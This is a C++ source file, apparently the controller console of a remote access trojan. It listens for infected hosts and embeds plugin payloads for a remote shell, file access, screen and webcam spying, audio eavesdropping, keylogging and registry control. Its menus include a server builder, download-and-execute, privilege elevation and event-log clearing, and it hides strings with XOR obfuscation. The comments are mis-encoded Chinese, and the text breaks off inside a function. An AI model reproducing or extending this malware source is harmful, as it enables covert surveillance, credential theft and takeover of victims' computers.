// MainFrm.cpp : implementation of the CMainFrame class
//

#include "stdafx.h"
#include "Client.h"
#include "ClientView.h"
#include "MainFrm.h"
#include "PcView.h"
#include "SettingDlg.h"
#include "FileManagerDlg.h"
#include "ScreenSpyDlg.h"
#include "ScreenSpyDlgs.h"
#include "WebCamDlg.h"
#include "ShellDlg.h"
#include "AudioDlg.h"
#include "SystemDlg.h"
#include "BuildDlg.h"
#include "LocalUpload.h"
#include "KeyBoardDlg.h"
#include "ServiceDlg.h"
#include "RegeditDlg.h"
#include "TextChatDlg.h"
#include "ProxyMapDlg.h"
#include "LogView.h"
#include "MyToolsKit.h"
#include "HackerTools.h"
#include "MyChat.h"
#include "ChromeDlg.h"
#include "Play.h"


#include "..\DLL\Plugins\C_FILE.h"
#include "..\DLL\Plugins\C_SHELL.h"
#include "..\DLL\Plugins\C_SCREEN.h"
#include "..\DLL\Plugins\C_SCREENS.h"
#include "..\DLL\Plugins\C_VIDEO.h"
#include "..\DLL\Plugins\C_LISTEN.h"
#include "..\DLL\Plugins\C_SYSTEM.h"
//#include "..\DLL\Plugins\C_KEYLOG.h"
#include "..\DLL\Plugins\C_SERVICE.h"
#include "..\DLL\Plugins\C_REGEDIT.h"
#include "..\DLL\Plugins\C_CHAT.h"
#include "..\DLL\Plugins\C_PROXYMAP.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif
extern HANDLE m_mutex;
CMainFrame	*g_pFrame;
CIOCPServer * m_iocpServer = NULL;
extern CClientView* g_pTabView; 
extern HMODULE hModule_shell32;
extern CLogView* g_pLogView;

LPBYTE lpFilePacket = NULL;
LPBYTE lpShellPacket = NULL;
LPBYTE lpScreenPacket = NULL;
LPBYTE lpScreenPacket1 = NULL;
LPBYTE lpWebCamPacket = NULL;
LPBYTE lpAudioPacket = NULL;
LPBYTE lpSystemPacket = NULL;
LPBYTE lpKeyboardPacket = NULL;
LPBYTE lpServicePacket = NULL;
LPBYTE lpRegeditPacket = NULL;
LPBYTE lpTextChatPacket = NULL;
LPBYTE lpProxyMapPacket = NULL;
int nFilePacketLength = 0;
int nShellPacketLength = 0;
int nScreenPacketLength = 0;
int nScreenPacketLength1 = 0;
int nWebCamPacketLength = 0;
int nAudioPacketLength = 0;
int nSystemPacketLength = 0;
int nKeyboardPacketLength = 0;
int nServicePacketLength = 0;
int nRegeditPacketLength = 0;
int nTextChatPacketLength = 0;
int nProxyPacketLength = 0;



/////////////////////////////////////////////////////////////////////////////
// CMainFrame

IMPLEMENT_DYNCREATE(CMainFrame, CXTPFrameWnd)

BEGIN_MESSAGE_MAP(CMainFrame, CXTPFrameWnd)
	//{{AFX_MSG_MAP(CMainFrame)
	ON_WM_CREATE()
	ON_WM_SYSCOMMAND()
	ON_COMMAND(ID_MENUITEM_SHOW, OnMenuitemShow)
	ON_COMMAND(ID_MENUITEM_HIDE, OnMenuitemHide)
	ON_WM_CLOSE()
	ON_COMMAND(ID_MENUITEM_SETTING, OnMenuitemSetting)
	ON_COMMAND(ID_MENUITEM_BUILD, OnMenuitemBuild)
	ON_COMMAND(IDM_TOOLS, OnTools)     //ÊµÓÃ¹¤¾ß
	ON_COMMAND(IDM_HackerTools, OnHackerTools)
	ON_WM_TIMER()

	//}}AFX_MSG_MAP
	ON_COMMAND(XTP_ID_CUSTOMIZE, OnCustomize)

	ON_XTP_CREATECONTROL()
	ON_COMMAND(IDM_IBBSOR_A, OnSz)
	ON_COMMAND(IDM_IBBSOR_B, OnSz)
	ON_COMMAND(IDM_IBBSOR_C, OnSz)
	ON_COMMAND(IDM_IBBSOR_D, OnSz)
	ON_COMMAND(IDM_IBBSOR_E, OnSz)
	ON_COMMAND(IDM_IBBSOR_F, OnSz)
	ON_COMMAND(IDM_IBBSOR_G, OnSz)

	ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)
	ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog)
	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG1, OnOpenScreenSpyDialog1)
	ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenWebCamDialog)
	ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
	ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)
	ON_MESSAGE(WM_OPENKEYBOARDDIALOG, OnOpenKeyBoardDialog)
	ON_MESSAGE(WM_OPENSERVICEDIALOG, OnOpenServiceDialog)
	ON_MESSAGE(WM_OPENREGEDITDIALOG, OnOpenRegeditDialog)
	ON_MESSAGE(WM_OPENTEXTCHATDIALOG, OnOpenTextChatDialog)
	ON_MESSAGE(WM_OPENPROXYMAPDIALOG, OnOpenProxyMapDialog) 
	ON_MESSAGE(WM_MODIFYLIST, OnModifyList)
	ON_MESSAGE(XTPWM_DOCKINGPANE_NOTIFY, OnDockingPaneNotify)
	ON_MESSAGE(WM_OPENCHROMEDIALOG, OnOpenChromeDialog)
	ON_MESSAGE(WM_OPENCHATDIALOG, OnOpenChatDialog)
END_MESSAGE_MAP()

static UINT indicators[] =
{
	ID_STAUTS_OS,	// Ö÷»úÍ³¼Æ
	ID_STAUTSSPEED,	// ÉÏ´«ÏÂÔØËÙ¶È
	ID_STAUTS_PORT,
	ID_INDICATOR_CAPS,
	ID_INDICATOR_NUM,
	ID_INDICATOR_SCRL,
};

/////////////////////////////////////////////////////////////////////////////
// CMainFrame construction/destruction

CMainFrame::CMainFrame()
{
	// TODO: add member initialization code here
	m_bSetRestart = NULL;
	g_pFrame = this;
    memset(nOSCount,0,sizeof(nOSCount)); 
}

CMainFrame::~CMainFrame()
{
}

int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CXTPFrameWnd::OnCreate(lpCreateStruct) == -1)
		return -1;

	//½çÃæ¾ÓÖÐÏÔÊ¾
	this ->CenterWindow(CWnd::GetDesktopWindow());

	// ³õÊ¼»¯ command bars
	if (!InitCommandBars())
		return -1;

	// »ñÈ¡ command bars Ä¿±ê Ö¸Õë
	CXTPCommandBars* pCommandBars = GetCommandBars();
	if(pCommandBars == NULL)
	{
		TRACE0("Failed to create command bars object.\n");
		return -1;      // fail to create
	}

	//Ìí¼Ó¹¤¾ßÌõ
/*	if (!m_wndToolBar.CreateEx(this, TBSTYLE_FLAT |TBSTYLE_LIST, 
		WS_CHILD | WS_VISIBLE | CBRS_ALIGN_TOP | CBRS_GRIPPER | CBRS_TOOLTIPS) ||
		!m_wndToolBar.LoadToolBar(IDR_TOOLBAR5))
	{
		TRACE0("Failed to create toolbar\n");
		return -1;      // fail to create
	}*/

	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		  sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}

//	SetMenu(NULL);//È¥³ý²Ëµ¥

	m_wndToolBar.ShowWindow(SW_HIDE); //Ä¬ÈÏÒþ²Ø¹¤¾ßÌõ
	//ÏÂÃæÊÇÔÊÐí¹¤¾ßÀ¸¿ÉÒÔÍÐ¶¯
	m_wndToolBar.SetButtonStyle(8,TBBS_AUTOSIZE); //ÉèÖÃ°´Å¥·ç¸ñ×Ô¶¯´óÐ¡
//	m_wndToolBar.EnableDocking(CBRS_ALIGN_ANY); //ÔÊÐí¹¤¾ßÀ¸ÔÚ¹¤¾ßÀ¸ÇøÓòÖÐÒÆ¶¯

	// Ìí¼Ó×´Ì¬À¸
	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}

	//ÉèÖÃÏÂÃæ×´Ì¬À¸
	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 200);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 70);
	
	// ´´½¨ÍÐÅÌÍ¼±ê
	if (!m_TrayIcon.Create(_T("Client"), // ÌáÊ¾ÎÄ±¾
		this,                       // ¸¸´°¿Ú
		IDR_MAINFRAME,              // ÍÐÅÌÍ¼±êID
		IDR_MENU_TRAY,              // ÓÒ¼ü²Ëµ¥ID
		ID_MENUITEM_SHOW,           // Ä¬ÈÏµ¥»÷ÊÂ¼þ
		false))                     // True if default menu item is located by position
	{
		TRACE0("Failed to create tray icon\n");
		return -1;
	}

	// ÉèÖÃ Ö÷¿ò¼Ü·ç¸ñ
	CXTPPaintManager::SetTheme(xtpThemeVisualStudio2010);

	// ¼ÓÔØÖ®Ç°µÄ¹¤¾ßÀ¸ºÍ²Ëµ¥¡£
//	LoadCommandBars(_T("CommandBars"));

	SetTimer(0, 1000, NULL);  //¿ªÆô¶¨Ê±Æ÷ 1
	LoadIcons();  //²Ëµ¥Í¼Æ¬ÏÔÊ¾

	m_paneManager.InstallDockingPanes(this);

	m_paneManager.SetTheme(xtpPaneThemeVisualStudio2010); // ÉèÖÃÖ÷Ìâ

	CXTPDockingPane* pwndPaneLog = CreatePane(300, 160, RUNTIME_CLASS(CLogView), _T("ÈÕÖ¾ÐÅÏ¢"), xtpPaneDockBottom);
	CXTPDockingPane* pwndPaneplay = CreatePane(270, 165, RUNTIME_CLASS(CPlay), _T("ÏµÍ³²Ù×÷"), xtpPaneDockBottom);

	m_paneManager.AttachPane(pwndPaneplay,pwndPaneLog);

	pwndPaneLog->Select();
	pwndPaneLog->SetOptions(xtpThemeVisualStudio2010);
	pwndPaneplay->SetOptions(xtpThemeVisualStudio2010);

	m_paneManager.ShowPane(pwndPaneLog, 1);
	// ³õÊ¼»¯²å¼þÄÚ´æ
	
	// File
	nFilePacketLength = (FILEMyFileSize + 1)*sizeof(char)+1;
	lpFilePacket = new BYTE[nFilePacketLength];
	if(lpFilePacket == NULL)
	{
		AfxMessageBox("³õÊ¼»¯File²å¼þÊ§°Ü£¡");
	}
	else
	{
		lpFilePacket[0] = COMMAND_LIST_DRIVE;
		memcpy(lpFilePacket + 1, (void*)FILEMyFileBuf, nFilePacketLength - 1);
	}

	// Shell
	nShellPacketLength = (SHELLMyFileSize + 1)*sizeof(char)+1;
	lpShellPacket = new BYTE[nShellPacketLength];
	if(lpShellPacket == NULL)
	{
		AfxMessageBox("³õÊ¼»¯shell²å¼þÊ§°Ü£¡");
	}
	else
	{
		lpShellPacket[0] = COMMAND_SHELL;
		memcpy(lpShellPacket + 1, (void*)SHELLMyFileBuf, nShellPacketLength - 1);
	}

	// ÆÁÄ»1
	nScreenPacketLength = (SCREENMyFileSize + 1)*sizeof(char)+1;
	lpScreenPacket = new BYTE[nScreenPacketLength];
	if(lpScreenPacket == NULL)
	{
		AfxMessageBox("³õÊ¼»¯Screen²å¼þÊ§°Ü£¡");
	}
	else
	{
 		lpScreenPacket[0] = COMMAND_SCREEN_SPY;
    	memcpy(lpScreenPacket + 1, (void*)SCREENMyFileBuf, nScreenPacketLength - 1);
	}
	// ÆÁÄ»2
	nScreenPacketLength1 = (SCREENSMyFileSize + 1)*sizeof(char)+1;
	lpScreenPacket1 = new BYTE[nScreenPacketLength1];
	if(lpScreenPacket1 == NULL)
	{
		AfxMessageBox("³õÊ¼»¯Screens²å¼þÊ§°Ü£¡");
	}
	else
	{
		lpScreenPacket1[0] = COMMAND_SCREEN_SPY1;
		memcpy(lpScreenPacket1 + 1, (void*)SCREENSMyFileBuf, nScreenPacketLength1 - 1);
	}
	// webcam
	nWebCamPacketLength = (VIDEOMyFileSize + 1)*sizeof(char)+1;
	lpWebCamPacket = new BYTE[nWebCamPacketLength];
	if(lpWebCamPacket == NULL)
	{
		AfxMessageBox("³õÊ¼»¯WebCam²å¼þÊ§°Ü£¡");
	}
	else
	{
		lpWebCamPacket[0] = COMMAND_WEBCAM;
		memcpy(lpWebCamPacket + 1, (void*)VIDEOMyFileBuf, nWebCamPacketLength - 1);
	}

	// Audio
	nAudioPacketLength = (LISTENMyFileSize + 1)*sizeof(char)+1;
	lpAudioPacket = new BYTE[nAudioPacketLength];
	if(lpAudioPacket == NULL)
	{
		AfxMessageBox("³õÊ¼»¯Audio²å¼þÊ§°Ü£¡");
	}
	else
	{
		lpAudioPacket[0] = COMMAND_AUDIO;
		memcpy(lpAudioPacket + 1, (void*)LISTENMyFileBuf, nAudioPacketLength - 1);
	}

	// System
	nSystemPacketLength = (SYSTEMMyFileSize + 1)*sizeof(char)+1;
	lpSystemPacket = new BYTE[nSystemPacketLength];
	if(lpSystemPacket == NULL)
	{
		AfxMessageBox("³õÊ¼»¯System²å¼þÊ§°Ü£¡");
	}
	else
	{
		lpSystemPacket[0] = COMMAND_SYSTEM;
		memcpy(lpSystemPacket + 1, (void*)SYSTEMMyFileBuf, nSystemPacketLength - 1);
	}

	// Keyboard
// 	nKeyboardPacketLength = (KEYLOGMyFileSize + 1)*sizeof(char)+1;
// 	lpKeyboardPacket = new BYTE[nKeyboardPacketLength];
// 	if(lpKeyboardPacket == NULL)
// 	{
// 		AfxMessageBox("³õÊ¼»¯Keyboard²å¼þÊ§°Ü£¡");
// 	}
// 	else
// 	{
// 		lpKeyboardPacket[0] = COMMAND_KEYBOARD;
// 		memcpy(lpKeyboardPacket + 1, (void*)KEYLOGMyFileBuf, nKeyboardPacketLength - 1);
// 	}

	// Service
	nServicePacketLength = (SERVICEMyFileSize + 1)*sizeof(char)+1;
	lpServicePacket = new BYTE[nServicePacketLength];
	if(lpServicePacket == NULL)
	{
		AfxMessageBox("³õÊ¼»¯Service²å¼þÊ§°Ü£¡");
	}
	else
	{
		lpServicePacket[0] = COMMAND_SERVICE_MANAGER;
		memcpy(lpServicePacket + 1, (void*)SERVICEMyFileBuf, nServicePacketLength - 1);
	}

	// Regedit
	nRegeditPacketLength = (REGEDITMyFileSize + 1)*sizeof(char)+1;
	lpRegeditPacket = new BYTE[nRegeditPacketLength];
	if(lpRegeditPacket == NULL)
	{
		AfxMessageBox("³õÊ¼»¯Regedit²å¼þÊ§°Ü£¡");
	}
	else
	{
		lpRegeditPacket[0] = COMMAND_REGEDIT;
		memcpy(lpRegeditPacket + 1, (void*)REGEDITMyFileBuf, nRegeditPacketLength - 1);
	}


	// TextChat
	nTextChatPacketLength = (CHATMyFileSize + 1)*sizeof(char)+1;
	lpTextChatPacket = new BYTE[nTextChatPacketLength];
	if(lpTextChatPacket == NULL)
	{
		AfxMessageBox("³õÊ¼»¯TextChat²å¼þÊ§°Ü£¡");
	}
	else
	{
		lpTextChatPacket[0] = COMMAND_TEXT_CHAT;
		memcpy(lpTextChatPacket + 1, (void*)CHATMyFileBuf, nTextChatPacketLength - 1);
	}


	// ProxyMap
	nProxyPacketLength = (PROXYMAPMyFileSize + 1)*sizeof(char)+1;
	lpProxyMapPacket = new BYTE[nProxyPacketLength];
	if(lpProxyMapPacket == NULL)
	{
		AfxMessageBox("³õÊ¼»¯ProxyMap²å¼þÊ§°Ü£¡");
	}
	else
	{
		lpProxyMapPacket[0] = COMMAND_PROXY_MAP;
    	memcpy(lpProxyMapPacket + 1, (void*)PROXYMAPMyFileBuf, nProxyPacketLength - 1);
	}

	return 0;
}

void CMainFrame::LoadIcons()   //ÓÒ¼ü²Ëµ¥ÏÔÊ¾Í¼±ê
{
	CXTPCommandBars* pCommandBars = GetCommandBars();

	UINT uiGroupFind0[] = {IDM_IBBSOR_A,IDM_IBBSOR_B,IDM_IBBSOR_C,IDM_IBBSOR_D,IDM_IBBSOR_E,IDM_IBBSOR_F,ID_MENUITEM_UNINSTALL,IDM_IBBSOR_G,ID_MENUITEM_SELECT_ALL,ID_MENUITEM_UNSELECT_ALL,0,0,0,0};

 	UINT uiGroupFind1[] = {ID_MENUITEM_FILEMANAGER,ID_MENUITEM_SCREENSPY,ID_MENUITEM_SCREENSPY1,ID_MENUITEM_SYSTEM,ID_MENUITEM_REMOTESHELL,ID_MENUITEM_KEYBOARD,
		ID_MENUITEM_WEBCAM,ID_MENUITEM_AUDIO_LISTEN,ID_MENUITEM_SERVICEMANAGER,ID_MENUITEM_REGEDIT,0,0,0,0};
	
	UINT uiGroupFind2[] = {ID_GUO_QDX,ID_UAC_QDX,ID_MENUITEM_PROXY,ID_MENUITEM_TEXT_CHAT,ID_MENUITEM_MESSAGEBOX,ID_DAK_JQB,IDM_MAP,IDM_NWCB,0,0,0,0,0,0};
	
	UINT uiGroupFind3[] = {ID_AK_ANZ,ID_UV_ANZ,0,0,0,0,0,0,0,0,0,0,0,0};

	UINT uiGroupFind4[] = {ID_MENUITEM_LOCAL_UPLOAD,ID_MENUITEM_DOWNEXEC,ID_MENUITEM_UPDATE_SERVER,ID_MENUITEM_OPEN_URL_SHOW,
		ID_MENUITEM_OPEN_URL_HIDE,ID_MENUITEM_COPY_IP,ID_MENUITEM_COPY_ALL,ID_MENUITEM_SAVE_IPLIST,ID_MENUITEM_FIND_PROCESS,
		ID_MENUITEM_FIND_WINDOW,ID_MENUITEM_CLEAN_FIND,0,0,0};

	UINT uiGroupFind5[] = {ID_MENUITEM_CHANGE_GROUP,ID_MENUITEM_REMARK,0,0,0,0,0,0,0,0,0,0,0,0};
	
	UINT uiGroupFind6[] = {ID_MENUITEM_LOGOFF,ID_MENUITEM_REBOOT,ID_MENUITEM_SHUTDOWN,0,0,0,0,0,0,0,0,0,0,0};
	
	UINT uiGroupFind7[] = {ID_MENUITEM_PROXY_MAP,IDM_START,ID_Screen,IDM_Elevate_Privileges,ID_EXP_ReStart,ID_IEQC,ID_MENUITEM_CLEANEVENT_ALL,IDM_CHROME,ID_IEQC1
		,ID_IEQC2,ID_IEQC3,ID_IEQC4,ID_IEQC5,ID_IEQC6}; //ÐÂ¼Ó

	pCommandBars->GetImageManager()->SetIcons(IDB_MENU0, uiGroupFind0, _countof(uiGroupFind0), CSize(16, 16));
 	pCommandBars->GetImageManager()->SetIcons(IDB_MENU1, uiGroupFind1, _countof(uiGroupFind1), CSize(16, 16));
 	pCommandBars->GetImageManager()->SetIcons(IDB_MENU2, uiGroupFind2, _countof(uiGroupFind2), CSize(16, 16));
 	pCommandBars->GetImageManager()->SetIcons(IDB_MENU3, uiGroupFind3, _countof(uiGroupFind3), CSize(16, 16));
 	pCommandBars->GetImageManager()->SetIcons(IDB_MENU4, uiGroupFind4, _countof(uiGroupFind4), CSize(16, 16));
 	pCommandBars->GetImageManager()->SetIcons(IDB_MENU5, uiGroupFind5, _countof(uiGroupFind5), CSize(16, 16));
	pCommandBars->GetImageManager()->SetIcons(IDB_MENU6, uiGroupFind6, _countof(uiGroupFind6), CSize(16, 16));
	pCommandBars->GetImageManager()->SetIcons(IDB_MENU7, uiGroupFind7, _countof(uiGroupFind7), CSize(16, 16));	
}
int CMainFrame::OnCreateControl(LPCREATECONTROLSTRUCT lpCreateControl)
{
	if (lpCreateControl->bToolBar == FALSE)
 	{
		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("Ö÷»ú²Ù×÷(&A)"))
		{
			if (lpCreateControl->nID != IDM_IBBSOR_A)
			{
				lpCreateControl->controlType = xtpControlPopup;
				lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
				lpCreateControl->nID = IDM_IBBSOR_A;
				return TRUE;
			}			
		}

		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("ÔöÇ¿¹¦ÄÜ(&B)"))
		{
			if (lpCreateControl->nID != IDM_IBBSOR_B)
			{
				lpCreateControl->controlType = xtpControlPopup;
				lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
				lpCreateControl->nID = IDM_IBBSOR_B;
				return TRUE;
			}
		}

		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("²å¼þ°²×°(&C)"))
		{
			if (lpCreateControl->nID != IDM_IBBSOR_C)
			{
				lpCreateControl->controlType = xtpControlPopup;
				lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
				lpCreateControl->nID = IDM_IBBSOR_C;
			}
			return TRUE;
		}

		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("ÆäËû¹¦ÄÜ(&D)"))
		{
			if (lpCreateControl->nID != IDM_IBBSOR_D)
			{
				lpCreateControl->controlType = xtpControlPopup;
				lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
				lpCreateControl->nID = IDM_IBBSOR_D;
			}
			return TRUE;
		}

		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("¸ü¸ÄÐÅÏ¢(&E)"))
		{
			if (lpCreateControl->nID != IDM_IBBSOR_E)
			{
				lpCreateControl->controlType = xtpControlPopup;
				lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
				lpCreateControl->nID = IDM_IBBSOR_E;
			}
			return TRUE;
		}

		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("Çå³ýÊý¾Ý(&G)"))
		{
			if (lpCreateControl->nID != IDM_IBBSOR_F)
			{
				lpCreateControl->controlType = xtpControlPopup;
				lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
				lpCreateControl->nID = IDM_IBBSOR_F;
			}
			return TRUE;
		}

		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("»á»°¹ÜÀí(&I)"))
		{
			if (lpCreateControl->nID != IDM_IBBSOR_G)
			{
				lpCreateControl->controlType = xtpControlPopup;
				lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
				lpCreateControl->nID = IDM_IBBSOR_G;
			}
			return TRUE;
		}

	}
	return FALSE;
}
//½âÃÜ×Ö·û´®
void EncryptData(char*szRec, unsigned long nLen, unsigned long key) //½âÃÜ²å¼þ
{
	unsigned long i;
	unsigned char p;
	p = (unsigned char ) key % 1451 + 61;
	for(i = 0; i < nLen; i++)
	{
		*szRec ^= p;
		*szRec += p;
		szRec++;
	}
}
BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
	if( !CXTPFrameWnd::PreCreateWindow(cs) )
		return FALSE;
	// TODO: Modify the Window class or styles here by modifying
	//  the CREATESTRUCT cs

	// ¿ÉÍÏ¶¯
// 	cs.lpszClass = _T("XTPMainFrame");
// 	CXTPDrawHelpers::RegisterWndClass(AfxGetInstanceHandle(), cs.lpszClass, 
// 		CS_DBLCLKS, AfxGetApp()->LoadIcon(IDR_MAINFRAME));
// 	cs.cx =  ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("CLIENT", "Width",  1230);
// 	cs.cy =  ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("CLIENT", "Hight",  650);

	// ¹Ì¶¨
	cs.lpszClass = _T("XTPMainFrame");
	CXTPDrawHelpers::RegisterWndClass(AfxGetInstanceHandle(), cs.lpszClass, 
		CS_DBLCLKS, AfxGetApp()->LoadIcon(IDR_MAINFRAME));
	
	cs.cx = 1200;
	cs.cy = 600;
	if (((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "LIST_DRAW", 0) == 0)
	{
		cs.style &= ~WS_MAXIMIZEBOX;   //È¥µô×î´ó»¯
		cs.style &= ~WS_THICKFRAME;    //½ûÖ¹ÓÃ»§¸Ä±ä´°¿Ú´óÐ¡
	}
	cs.dwExStyle&=~WS_EX_CLIENTEDGE;
	cs.style &= ~FWS_ADDTOTITLE;
	// Ö÷´°¿Ú±êÌâ
	
	char bti[] ="¬¶DVN”:$ÁÌÀ<ÍÍÍÍEA·N¥«¸µ8";
	EncryptData((char*)bti,strlen(bti),124);
	CString user = ((CClientApp *)AfxGetApp())->m_IniFile.GetString("USER","username","");
	cs.lpszName = bti+user;
	
	return TRUE;
}

/////////////////////////////////////////////////////////////////////////////
// CMainFrame diagnostics

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
	CXTPFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CXTPFrameWnd::Dump(dc);
}

#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CMainFrame message handlers
//void CMainFrame::OnPopup() {}

// ¼¤»î¼àÌý·þÎñ
void CMainFrame::Activate(int nPort, int nMaxConnections)
{
	//ÅÐ¶ÏÕâ¸öm_iocpServerÈ«¾Ö±äÁ¿ÊÇ·ñÒÑ¾­Ö¸ÏòÁËÒ»¸öCIOCPServer
	if (m_iocpServer != NULL)
	{
		//£¬Èç¹ûÊÇµÄ»°£¬¾ÍÒªÏÈ¹Ø±ÕËü£¬²¢ÇÒÉ¾³ýµôÕâ¸öCIOCPServerËùÕ¼µÄÄÚ´æ¿Õ¼ä
		m_iocpServer->Shutdown();
		delete m_iocpServer;
	}
	m_iocpServer = new CIOCPServer;
	// ¿ªÊ¼ÐÄÌø
	m_iocpServer->m_nHeartBeatTime = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Xintiao", 0);

	CString str,IP,strLogText;
	char shenming[]="µÒ»ç›¢£¦Ë‘²¥Ë»­¾È¦«°¥À¼ÑÏ©±«›¦È²¥Ë»ÉßÈÐ«µ©¸Ê£·Ì³ì²—ËÂÇçÉßÎÞ¥Ä";
	EncryptData((char*)shenming,strlen(shenming),81);
	str.Format(shenming);
	g_pLogView->InsertLogItem( str, 0, 0 );

	// ¿ªÆôIPCP·þÎñÆ÷
 	if (m_iocpServer->Initialize(NotifyProc, nMaxConnections, nPort))
 	{

		char hostname[256]; 
		memset(hostname,0,256);
 		gethostname(hostname, sizeof(hostname));
		HOSTENT *host = gethostbyname(hostname);
			
		if (host != NULL)
		{
			for ( int i=0; ; i++ )
			{ 
				IP += inet_ntoa(*(IN_ADDR*)host->h_addr_list[i]);
				if ( host->h_addr_list[i] + host->h_length >= host->h_name )
					break;
				IP += "/";
			}
		}	
		else
			IP = _T("127.0.0.1");

		str.Format("¶Ë¿Ú:%d",nPort);
		m_wndStatusBar.SetPaneText(2, str);
		strLogText.Format( "¼àÌý¶Ë¿Ú: [ %d ]  ³É¹¦", nPort );
		g_pLogView->InsertLogItem( strLogText, 0, 4 );

 	}
	else
	{
		IP.Format(_T("¶Ë¿Ú %d ¼àÌýÊ§°Ü"), nPort);
		m_wndStatusBar.SetPaneText(2, "¶Ë¿Ú:0");
		strLogText.Format( "¼àÌý¶Ë¿Ú: [ %d ]  Ê§°Ü", nPort );
		g_pLogView->InsertLogItem( strLogText, 0, 5 );
	}

 	m_wndStatusBar.SetPaneText(0, _T("Á¬½Ó: 0"));
}

void CALLBACK CMainFrame::NotifyProc( ClientContext *pContext, UINT nCode )
{
	switch (nCode)
	{
	case NC_CLIENT_CONNECT:
		break;
	case NC_CLIENT_DISCONNECT:
		g_pFrame->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
		break;
	case NC_TRANSMIT:
		break;
	case NC_RECEIVE:
		ProcessReceive(pContext);
		break;
	case NC_RECEIVE_COMPLETE:
		ProcessReceiveComplete(pContext);
		break;
	default:
		break;
	}
}
void CMainFrame::OnTools() 
{
	// TODO: Add your command handler code here
	CMyToolsKit dlg;
	dlg.DoModal();
}
void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
{
	if (pContext == NULL)
		return;

	// Èç¹û¹ÜÀí¶Ô»°¿ò´ò¿ª£¬½»¸øÏàÓ¦µÄ¶Ô»°¿ò´¦Àí
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	
	// ½»¸ø´°¿Ú´¦Àí
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case FILEMANAGER_DLG:
			((CFileManagerDlg *)dlg)->OnReceiveComplete();
			break;
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
			break;
		case SCREENSPY_DLG1:   //Ô¶³Ì×ÀÃæ
			((CScreenSpyDlgs *)dlg)->OnReceiveComplete();
			break;
		case SHELL_DLG:
			((CShellDlg *)dlg)->OnReceiveComplete();
			break;
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceiveComplete();
			break;
		case AUDIO_DLG:
			((CAudioDlg *)dlg)->OnReceiveComplete();
			break;
		case SYSTEM_DLG:
			((CSystemDlg *)dlg)->OnReceiveComplete();
			break;
		case KEYBOARD_DLG:
			((CKeyBoardDlg *)dlg)->OnReceiveComplete();
			break;
		case SERVICE_DLG:
			((CServiceDlg *)dlg)->OnReceiveComplete();
			break;
		case REGEDIT_DLG:
			((CRegeditDlg *)dlg)->OnReceiveComplete();
			break;
		case CHAT_DLG:
			((CTextChatDlg *)dlg)->OnReceiveComplete();
			break;
		case CHAT_DLG1:
			((CMyChat *)dlg)->OnReceiveComplete();//¼ôÇÐ°å
			break;
		case PROXYMAP_DLG:
	    	((CProxyMapDlg *)dlg)->OnReceiveComplete();
			break;
		default:
			break;
		}
		return;
	}

	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_LOGIN: // ÉÏÏß°ü
		{
			pContext->m_bIsMainSocket = TRUE;
			g_pTabView->PostMessage(WM_ADDFINDGROUP, 0, (LPARAM)pContext);
		}
		break;
	case TOKEN_DRIVE_LIST: // ÎÄ¼þ¹ÜÀí Çý¶¯Æ÷ÁÐ±í
		// Ö¸½Óµ÷ÓÃpublicº¯Êý·ÇÄ£Ì¬¶Ô»°¿ò»áÊ§È¥·´Ó¦£¬ ²»ÖªµÀÔõÃ´»ØÊÂ,Ì«²Ë
		g_pFrame->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;
